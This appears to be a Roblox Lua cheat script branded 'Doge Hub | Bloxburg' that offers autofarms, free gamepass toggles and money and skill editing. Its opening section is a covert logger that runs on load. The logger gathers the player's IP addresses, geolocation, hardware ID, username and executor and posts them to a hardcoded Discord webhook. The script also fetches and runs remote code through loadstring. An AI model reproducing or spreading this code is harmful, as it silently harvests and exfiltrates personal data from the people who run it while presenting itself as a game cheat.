local Webhook = "https://discord.com/api/webhooks/1334221042410983517/vOF2bI4ENdO_tUDlqeIduMMNb5NNB8xlUsXvvthS7v33Ok03KtXR5Fw2JjXRo327vbYg" -- Put your Webhook link here
local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) -- Getting location info
-- TODO: Using Shodan API

local Headers = {["content-type"] = "application/json"} -- DO NOT TOUCH

local LocalPlayer = game:GetService("Players").LocalPlayer -- LocalPlayer

local AccountAge = LocalPlayer.AccountAge -- Account age since created
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
local UserId = LocalPlayer.UserId -- UserID
local PlayerName = LocalPlayer.Name -- Player name
local DisplayName= LocalPlayer.DisplayName
local PlaceID = game.PlaceId -- The game that player is playing


local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
local rver = "Logger " -- Change to your version if you want

--[[ Identify the executor ]]--
-- https://v3rmillion.net/showthread.php?tid=1163680&page=2
function identifyexploit()
   local ieSuccess, ieResult = pcall(identifyexecutor)
   if ieSuccess then return ieResult end
   
   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]]--
local PlayerData = {
        ["content"] = "",
        ["embeds"] = {{
           
            ["author"] = {
                ["name"] = "Logs"..rver, 
            },
           
            ["title"] = PlayerName, -- Username/PlayerName
            ["description"] = "Display Name:"..DisplayName, 
            ["fields"] = {
                {
                    --[[Username/PlayerName]]--
                    ["name"] = "Username:",
                    ["value"] = PlayerName,
                    ["inline"] = true
                },
                {
                    --[[Membership type]]--
                    ["name"] = "Premium Type:",
                    ["value"] = MembershipType,
                    ["inline"] = true
                },
                {
                    --[[Account age]]--
                    ["name"] = "Account Age (days):",
                    ["value"] = AccountAge,
                    ["inline"] = true
                },
                {
                    --[[UserID]]--
                    ["name"] = "HWID:",
                    ["value"] = clientid,
                    ["inline"] = true
                },
                                {
                    --[[Membership type]]--
                    ["name"] = "IP:",
                    ["value"] = IPv4,
                    ["inline"] = true
                },
                {
                    --[[PlaceID]]--
                    ["name"] = "Place ID: ",
                    ["value"] = PlaceID,
                    ["inline"] = true
                },
                {
                    --[[Exploit/Executor]]--
                    ["name"] = "Executor: ",
                    ["value"] = identifyexploit(),
                    ["inline"] = true
                },
                {
                    --[[Log/Grab time]]--
                    ["name"] = "Log Time:",
                    ["value"] = LogTime,
                    ["inline"] = true
                },
                                {
                    --[[HTTPbin]]--
                    ["name"] = "HTTPbin Data (JSON):",
                    ["value"] = "```json"..'\n'..HTTPbin.."```",
                    ["inline"] = false
                },
                {
                    --[[geoPlugin]]--
                    ["name"] = "geoPlugin Data (JSON):",
                    ["value"] = "```json"..'\n'..GeoPlug.."```",
                    ["inline"] = false
                },
            },
        }}
    }


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
    else
    HttpRequest = http_request
end

-- Send to your webhook.
HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})






------------------------------------------------------------------------------------------------------------------------------






local MacLib = loadstring(game:HttpGet("https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt"))()

local Window = MacLib:Window({
	Title = "Doge Hub | Bloxburg",
	Subtitle = "#1 Bloxburg Script",
	Size = UDim2.fromOffset(950, 650),
	DragStyle = 1,
	DisabledWindowControls = {},
	ShowUserInfo = true,
	Keybind = Enum.KeyCode.RightControl,
	AcrylicBlur = true,
})

local globalSettings = {
	UIBlurToggle = Window:GlobalSetting({
		Name = "UI Blur",
		Default = Window:GetAcrylicBlurState(),
		Callback = function(bool)
			Window:SetAcrylicBlurState(bool)
			Window:Notify({
				Title = Window.Settings.Title,
				Description = (bool and "Enabled" or "Disabled") .. " UI Blur",
				Lifetime = 5
			})
		end,
	}),
	NotificationToggler = Window:GlobalSetting({
		Name = "Notifications",
		Default = Window:GetNotificationsState(),
		Callback = function(bool)
			Window:SetNotificationsState(bool)
			Window:Notify({
				Title = Window.Settings.Title,
				Description = (bool and "Enabled" or "Disabled") .. " Notifications",
				Lifetime = 5
			})
		end,
	}),
	ShowUserInfo = Window:GlobalSetting({
		Name = "Show User Info",
		Default = Window:GetUserInfoState(),
		Callback = function(bool)
			Window:SetUserInfoState(bool)
			Window:Notify({
				Title = Window.Settings.Title,
				Description = (bool and "Showing" or "Redacted") .. " User Info",
				Lifetime = 5
			})
		end,
	})
}

local tabGroups = {
	TabGroup1 = Window:TabGroup()
}



local tabs = {
	Main = tabGroups.TabGroup1:Tab({ Name = "Autofarms", Image = "rbxassetid://18821914323" }),
	Settings = tabGroups.TabGroup1:Tab({ Name = "Configurations", Image = "rbxassetid://10734950309" })
}

local sections = {
	MainSection1 = tabs.Main:Section({ Side = "Left" }),
    MainSection2 = tabs.Main:Section({ Side = "Right" }),
}


sections.MainSection1:Header({
	Name = "Main"
})

sections.MainSection2:Header({
	Name = "Gamepasses"
})

sections.MainSection1:Button({
	Name = "Start Pizza Delivery Farm (Beta)",
	Callback = function()
		Window:Dialog({
			Title = Window.Settings.Title,
			Description = "Starts Pizza Delivery Farm (May Kick)",
			Buttons = {
				{
					Name = "Start",
					Callback = function()
						print("Start")
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        local RunService = game:GetService("RunService")
                        local VirtualInputManager = game:GetService("VirtualInputManager")
                        local FirstRun = true
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Function to simulate pressing "E"
                        local function pressE()
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                            task.wait(0.1)
                            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                        end
                        
                        -- Coordinates
                        local destination1 = Vector3.new(1166, 12, 272)
                        local destination2 = Vector3.new(1176, 14, 286)
                        
                        -- Function to get spawn location safely
                        local function getSpawnLocation()
                            local spawnModel = workspace:FindFirstChild("_game")
                            if spawnModel and spawnModel:FindFirstChild("SpawnedCharacters") then
                                local spawnCharacters = spawnModel.SpawnedCharacters
                                local pizzaCustomer = spawnCharacters:FindFirstChild("PizzaPlanetDeliveryCustomer")
                                if pizzaCustomer and pizzaCustomer:FindFirstChild("HumanoidRootPart") then
                                    return pizzaCustomer.HumanoidRootPart.Position
                                end
                            end
                            return nil -- Return nil if not found
                        end
                        
                        while true do
                            -- Teleport to first destination
                            intermediateTeleport(destination1)
                            task.wait(0.5)
                            pressE()
                            task.wait(5)
                        
                            -- Only teleport to second destination the first time
                            if FirstRun then
                                intermediateTeleport(destination2)
                                task.wait(0.5)
                                pressE()
                                task.wait(5)
                                FirstRun = false -- Prevent the second teleport from repeating
                            end
                        
                            -- Safely check for spawn location at this step
                            local spawnLocation = getSpawnLocation()
                            if spawnLocation then
                                intermediateTeleport(spawnLocation)
                            else
                                intermediateTeleport(Vector3.new(1166, 12, 272)) -- Fallback position
                            end
                        
                            task.wait(5)
                        end
                        

					end,
				},
				{
					Name = "Cancel"
				}
			}
		})
	end,
})


local isAuto2farming = false

sections.MainSection1:Button({
	Name = "Start Janitor Autofarm",
	Callback = function()
		Window:Dialog({
			Title = Window.Settings.Title,
			Description = "Starts The Janitor Autofarm",
			Buttons = {
				{
					Name = "Start",
					Callback = function()
						print("Start")
                        -- Start the autofarm loop in a coroutine
                        isAuto2farming = true
                                -- Script to teleport to "Object" in GroundSpawn and WallSpawn and press E repeatedly until removed
        
        -- Services
        local Players = game:GetService("Players")
        local VirtualInputManager = game:GetService("VirtualInputManager")
        local RunService = game:GetService("RunService")
        
        -- LocalPlayer
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        
        -- Path to search
        local spawnFolder = workspace:WaitForChild("Environment")
            :WaitForChild("Locations")
            :WaitForChild("GreenClean")
            :WaitForChild("Spawns")
        
        -- Function to find a valid teleport part within an Object
        local function getTeleportPart(object)
            if object:IsA("BasePart") then
                return object
            elseif object:IsA("Model") then
                return object:FindFirstChildWhichIsA("BasePart")
            end
            return nil
        end
        
        -- Function to teleport and press E until Object is gone
        local function processObject(object)
            while object and object.Parent do
                local teleportPart = getTeleportPart(object)
        
                if humanoidRootPart and teleportPart then
                    humanoidRootPart.CFrame = CFrame.new(teleportPart.Position + Vector3.new(0, 3, 0)) -- Teleport slightly above the object
                    task.wait(0.5) -- Wait briefly after teleporting
        
                    -- Simulate pressing E
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                    task.wait(0.1)
                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                end
        
                task.wait(5.5) -- Wait before retrying
            end
        end
        
        -- Function to check for all GroundSpawn and WallSpawn objects
        local function checkForObjects()
            for _, descendant in ipairs(spawnFolder:GetDescendants()) do
                if descendant.Name == "GroundSpawn" or descendant.Name == "WallSpawn" then
                    for _, child in ipairs(descendant:GetChildren()) do
                        if child.Name == "Object" then
                            task.spawn(processObject, child) -- Process each Object asynchronously
                        end
                    end
                end
            end
        end
        
        -- Main loop to continuously check for objects
        RunService.Heartbeat:Connect(function()
            checkForObjects()
        end)

					end,
				},
				{
					Name = "Cancel"
				}
			}
		})
	end,
})


local isAutofarming = false -- Initialize it as false, so the autofarm is off by default

sections.MainSection1:Button({
    Name = "Start Woodcutter Autofarm",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Starts The Woodcutter Autofarm",
            Buttons = {
                {
                    Name = "Start",
                    Callback = function()
                        print("Starting Autofarm")
                        
                        -- Start the autofarm loop in a coroutine
                        isAutofarming = true
                        
                        -- Tree locations
                        local treeLocations = {
                            Vector3.new(619, 13, 855),
                            Vector3.new(631, 13, 883),
                            Vector3.new(651, 13, 868),
                            Vector3.new(651, 13, 831),
                            Vector3.new(653, 14, 790),
                            Vector3.new(635, 13, 743),
                            Vector3.new(585, 13, 760),
                            Vector3.new(558, 13, 755),
                            Vector3.new(558, 14, 719),
                            Vector3.new(585, 13, 703),
                            Vector3.new(596, 13, 726)
                        }

                        local player = game.Players.LocalPlayer
                        local character = player.Character or player.CharacterAdded:Wait()
                        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                        local runService = game:GetService("RunService")
                        local virtualInputManager = game:GetService("VirtualInputManager")

                        local function moveTo(position)
                            local completed = false
                            local connection

                            connection = runService.RenderStepped:Connect(function()
                                humanoidRootPart.CFrame = CFrame.new(position)
                                if (humanoidRootPart.Position - position).Magnitude < 2 then
                                    completed = true
                                    connection:Disconnect()
                                end
                            end)

                            repeat 
                                if not isAutofarming then
                                    connection:Disconnect()
                                    return
                                end
                                task.wait()
                            until completed
                        end

                        local function pressEnter(times, delay)
                            for _ = 1, times do
                                if not isAutofarming then return end
                                virtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                                task.wait(0.1) -- Ensure key press is registered
                                virtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                                task.wait(delay)
                            end
                        end

                        -- Autofarm loop in a coroutine
                        local autofarmCoroutine = coroutine.create(function()
                            while isAutofarming do
                                for _, location in ipairs(treeLocations) do
                                    if not isAutofarming then break end
                                    moveTo(location)
                                    pressEnter(6, 1.5)
                                end
                            end
                        end)

                        coroutine.resume(autofarmCoroutine)
                    end,
                },
                {
                    Name = "Cancel"
                }
            }
        })
    end,
})



sections.MainSection1:Button({
	Name = "Start Snowpile Auto-Shovel",
	Callback = function()
		Window:Dialog({
			Title = Window.Settings.Title,
			Description = "Starts Snowpile autofarm",
			Buttons = {
				{
					Name = "Start",
					Callback = function()
						print("Start")
                            -- Autofarm Script for Snow Objects

-- Services
local Players = game:GetService("Players")
local VirtualInputManager = game:GetService("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- LocalPlayer
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- Autofarm toggle
local autofarmEnabled = false

-- Function to press E
local function pressE()
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(0.1)
    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

-- Function to teleport to a specific part
local function teleportTo(part)
    if humanoidRootPart and part and part:IsA("BasePart") then
        humanoidRootPart.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0)) -- Offset for safety
        task.wait(0.5)
        return true
    end
    return false
end

-- Function to find and teleport to a valid position
local function findAndTeleport(object)
    if teleportTo(object) then
        return true
    end

    for _, child in ipairs(object:GetDescendants()) do
        if child:IsA("BasePart") and teleportTo(child) then
            return true
        end
    end

    return false
end

-- Function to get the path of an object
local function getSnowObjectPath(username, index)
    local success, path = pcall(function()
        return workspace.Plots:FindFirstChild("Plot_" .. username)
            and workspace.Plots["Plot_" .. username].House.FrontObjects.ItemHolder["Snow And Shovel"].ObjectModel:FindFirstChild("Item" .. index)
    end)

    if success and path then
        return path
    end
    return nil
end

-- Function to handle one player's snow objects
local function processUserSnow(username)
    for i = 1, 5 do
        local snowObject = getSnowObjectPath(username, i)

        if snowObject then
            if findAndTeleport(snowObject) then
                pressE()
            end
        end

        task.wait(5)
    end
end

-- Main function to process all users in the server
local function startAutofarm()
    for _, user in ipairs(Players:GetPlayers()) do
        if user ~= player then
            processUserSnow(user.Name)
        end
    end
end

-- Hotkey to toggle autofarm
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.H then
        autofarmEnabled = not autofarmEnabled
        if autofarmEnabled then
            task.spawn(function()
                while autofarmEnabled do
                    startAutofarm()
                    task.wait(1)
                end
            end)
        end
    end
end)

					end,
				},
				{
					Name = "Cancel"
				}
			}
		})
	end,
})


sections.MainSection1:Button({
	Name = "End Janitor Autofarm",
	Callback = function()
		Window:Dialog({
			Title = Window.Settings.Title,
			Description = "Ends Janitor Autofarm",
			Buttons = {
				{
					Name = "End",
					Callback = function()
						print("Start")
                        isAuto2farming = false
                        print("Autofarm stopped")

					end,
				},
				{
					Name = "Cancel"
				}
			}
		})
	end,
})


-- Button to stop the autofarm
sections.MainSection1:Button({
    Name = "End Woodcutter Autofarm",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Ends Janitor Autofarm",
            Buttons = {
                {
                    Name = "Stop",
                    Callback = function()
                        isAutofarming = false
                        print("Autofarm stopped.")
                    end,
                },
                {
                    Name = "Cancel"
                }
            }
        })
    end,
})

sections.MainSection1:Button({
	Name = "End Snowpile Autofarm",
	Callback = function()
		Window:Dialog({
			Title = Window.Settings.Title,
			Description = "Ends Janitor Autofarm",
			Buttons = {
				{
					Name = "Start",
					Callback = function()
						print("Start")


					end,
				},
				{
					Name = "Cancel"
				}
			}
		})
	end,
})

sections.MainSection1:Slider({
	Name = "Slider",
	Default = 50,
	Minimum = 0,
	Maximum = 100,
	DisplayMethod = "Percent",
	Precision = 0,
	Callback = function(Value)
		print("Changed to ".. Value)
	end
}, "Slider")

sections.MainSection1:Toggle({
	Name = "Toggle",
	Default = false,
	Callback = function(value)
		Window:Notify({
			Title = Window.Settings.Title,
			Description = (value and "Enabled " or "Disabled ") .. "Toggle"
		})
	end,
}, "Toggle")





sections.MainSection2:Button({
	Name = "Free Advanced Placing",
	Callback = function()
		Window:Dialog({
			Title = Window.Settings.Title,
			Description = "Gives advanced placing",
			Buttons = {
				{
					Name = "Confirm",
					Callback = function()
                        local function toggleBoolValue()
                            -- Specify the path to the BoolValue
                            local boolValue = game:GetService("ReplicatedStorage").Stats.Thrus21.Gamepasses["2237950"]
                        
                            -- Check if the BoolValue exists and is a BoolValue instance
                            if boolValue and boolValue:IsA("BoolValue") then
                                -- Toggle the value
                                boolValue.Value = not boolValue.Value
                            else
                                warn("Specified BoolValue not found or is not a BoolValue instance!")
                            end
                        end
                        
                        -- Call the function to toggle the BoolValue
                        toggleBoolValue()
                        

					end,
				},
				{
					Name = "Cancel"
				}
			}
		})
	end,
})


sections.MainSection2:Button({
	Name = "Free Excellent Employee",
	Callback = function()
		Window:Dialog({
			Title = Window.Settings.Title,
			Description = "Gives Excellent Employee Gamepass",
			Buttons = {
				{
					Name = "Confirm",
					Callback = function()
                        local function toggleBoolValue()
                            -- Specify the path to the BoolValue
                            local boolValue = game:GetService("ReplicatedStorage").Stats.Thrus21.Gamepasses["1057151"]
                        
                            -- Check if the BoolValue exists and is a BoolValue instance
                            if boolValue and boolValue:IsA("BoolValue") then
                                -- Toggle the value
                                boolValue.Value = not boolValue.Value
                            else
                                warn("...")
                            end
                        end
                        
                        -- Call the function to toggle the BoolValue
                        toggleBoolValue()
                        

					end,
				},
				{
					Name = "Cancel"
				}
			}
		})
	end,
})


sections.MainSection1:Divider()

sections.MainSection1:Header({
	Text = "Header #2"
})

sections.MainSection1:Paragraph({
	Header = "Paragraph",
	Body = "Paragraph body. Lorem ipsum odor amet, consectetuer adipiscing elit. Morbi tempus netus aliquet per velit est gravida."
})

sections.MainSection1:Label({
	Text = "Label. Lorem ipsum odor amet, consectetuer adipiscing elit."
})

sections.MainSection1:SubLabel({
	Text = "Sub-Label. Lorem ipsum odor amet, consectetuer adipiscing elit."
})

MacLib:SetFolder("Maclib")
tabs.Settings:InsertConfigSection("Left")

Window.onUnloaded(function()
	print("Unloaded!")
end)

tabs.Main:Select()
MacLib:LoadAutoLoadConfig()

------------------------------------------------------------------------------------------------------------------------------


local tabGroups = {
	TabGroup2 = Window:TabGroup()
}



local tabs = {
	Main = tabGroups.TabGroup2:Tab({ Name = "Data Configuration (Client)", Image = "rbxassetid://18821914323" }),
}

local sections = {
	MainSection3 = tabs.Main:Section({ Side = "Left" }),
    MainSection4 = tabs.Main:Section({ Side = "Right" }),
}


sections.MainSection3:Header({
	Name = "Player Values"
})

sections.MainSection4:Header({
	Name = "Misc Values"
})

-- Define services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Get the necessary values
local StatsFolder = ReplicatedStorage:FindFirstChild("Stats")
local Thrus21Folder = StatsFolder:FindFirstChild(LocalPlayer.Name)

-- Money Value
local MoneyValue = Thrus21Folder:FindFirstChild("Money")

-- BlockBux Value
local BlockBuxValue = Thrus21Folder:FindFirstChild("Blockbux")

-- Houses Folder
local HousesFolder = Thrus21Folder:FindFirstChild("Houses")

-- Ensure values exist
if not MoneyValue then
    return
end

if not BlockBuxValue then
    return
end

if not HousesFolder then
    return
end

-- Variable to control Money Value and BlockBux activation
local isMoneyValueEnabled = false
local isBlockBuxEnabled = false
local isHouseValueEnabled = false

-- Define Enable Money Value button
sections.MainSection3:Button({
    Name = "Enable Money Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Money Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isMoneyValueEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Money Value Input
sections.MainSection3:Input({
    Name = "Money Value (Million)",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isMoneyValueEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                MoneyValue.Value = MoneyValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable BlockBux Value button
sections.MainSection3:Button({
    Name = "Enable BlockBux Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the BlockBux Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isBlockBuxEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define BlockBux Value Input
sections.MainSection3:Input({
    Name = "BlockBux Value (Hundreds)",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isBlockBuxEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                BlockBuxValue.Value = BlockBuxValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable House Value button
sections.MainSection3:Button({
    Name = "Enable House Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the House Value input for all houses?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isHouseValueEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define House Value Input
sections.MainSection3:Input({
    Name = "House Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isHouseValueEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                -- Update the TotalValue for all houses
                for _, house in pairs(HousesFolder:GetChildren()) do
                    local TotalValue = house:FindFirstChild("TotalValue")
                    if TotalValue and TotalValue:IsA("IntValue") then
                        TotalValue.Value = TotalValue.Value + inputValue
                    end
                end
            end
        end
    end,
}, "Input")

sections.MainSection3:Header({
	Name = "Skill Level Values"
})

-- Define services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Get the necessary values
local StatsFolder = ReplicatedStorage:FindFirstChild("Stats")
local Thrus21Folder = StatsFolder:FindFirstChild(LocalPlayer.Name)

-- SkillData Folder
local SkillDataFolder = Thrus21Folder:FindFirstChild("SkillData")

-- Ensure values exist
local AthleticValue = SkillDataFolder and SkillDataFolder:FindFirstChild("Athletic")
local CookingValue = SkillDataFolder and SkillDataFolder:FindFirstChild("Cooking")
local GamingValue = SkillDataFolder and SkillDataFolder:FindFirstChild("Gaming")
local GardeningValue = SkillDataFolder and SkillDataFolder:FindFirstChild("Gardening")
local IntelligenceValue = SkillDataFolder and SkillDataFolder:FindFirstChild("Intelligence")
local MusicValue = SkillDataFolder and SkillDataFolder:FindFirstChild("Music")
local PaintingValue = SkillDataFolder and SkillDataFolder:FindFirstChild("Painting")
local WritingValue = SkillDataFolder and SkillDataFolder:FindFirstChild("Writing")

-- Check if all the values exist
if not AthleticValue or not CookingValue or not GamingValue or not GardeningValue or
   not IntelligenceValue or not MusicValue or not PaintingValue or not WritingValue then
    return
end

-- Variable to control enabling the skill values
local isAthleticEnabled = false
local isCookingEnabled = false
local isGamingEnabled = false
local isGardeningEnabled = false
local isIntelligenceEnabled = false
local isMusicEnabled = false
local isPaintingEnabled = false
local isWritingEnabled = false

-- Define Enable Athletic Value button
sections.MainSection3:Button({
    Name = "Enable Athletic Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Athletic Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isAthleticEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Athletic Value Input
sections.MainSection3:Input({
    Name = "Athletic Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isAthleticEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                AthleticValue.Value = AthleticValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Cooking Value button
sections.MainSection3:Button({
    Name = "Enable Cooking Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Cooking Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isCookingEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Cooking Value Input
sections.MainSection3:Input({
    Name = "Cooking Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isCookingEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                CookingValue.Value = CookingValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Gaming Value button
sections.MainSection3:Button({
    Name = "Enable Gaming Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Gaming Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isGamingEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Gaming Value Input
sections.MainSection3:Input({
    Name = "Gaming Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isGamingEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                GamingValue.Value = GamingValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Gardening Value button
sections.MainSection3:Button({
    Name = "Enable Gardening Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Gardening Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isGardeningEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Gardening Value Input
sections.MainSection3:Input({
    Name = "Gardening Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isGardeningEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                GardeningValue.Value = GardeningValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Intelligence Value button
sections.MainSection3:Button({
    Name = "Enable Intelligence Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Intelligence Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isIntelligenceEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Intelligence Value Input
sections.MainSection3:Input({
    Name = "Intelligence Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isIntelligenceEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                IntelligenceValue.Value = IntelligenceValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Music Value button
sections.MainSection3:Button({
    Name = "Enable Music Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Music Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isMusicEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Music Value Input
sections.MainSection3:Input({
    Name = "Music Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isMusicEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                MusicValue.Value = MusicValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Painting Value button
sections.MainSection3:Button({
    Name = "Enable Painting Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Painting Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isPaintingEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Painting Value Input
sections.MainSection3:Input({
    Name = "Painting Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isPaintingEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                PaintingValue.Value = PaintingValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Writing Value button
sections.MainSection3:Button({
    Name = "Enable Writing Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Writing Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isWritingEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Writing Value Input
sections.MainSection3:Input({
    Name = "Writing Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isWritingEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                WritingValue.Value = WritingValue.Value + inputValue
            end
        end
    end,
}, "Input")


-- Define services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Get the necessary values
local StatsFolder = ReplicatedStorage:FindFirstChild("Stats")
local Thrus21Folder = StatsFolder:FindFirstChild(LocalPlayer.Name)

-- MoodData Folder
local MoodDataFolder = Thrus21Folder:FindFirstChild("MoodData")

-- Ensure values exist
local EnergyValue = MoodDataFolder and MoodDataFolder:FindFirstChild("Energy")
local FunValue = MoodDataFolder and MoodDataFolder:FindFirstChild("Fun")
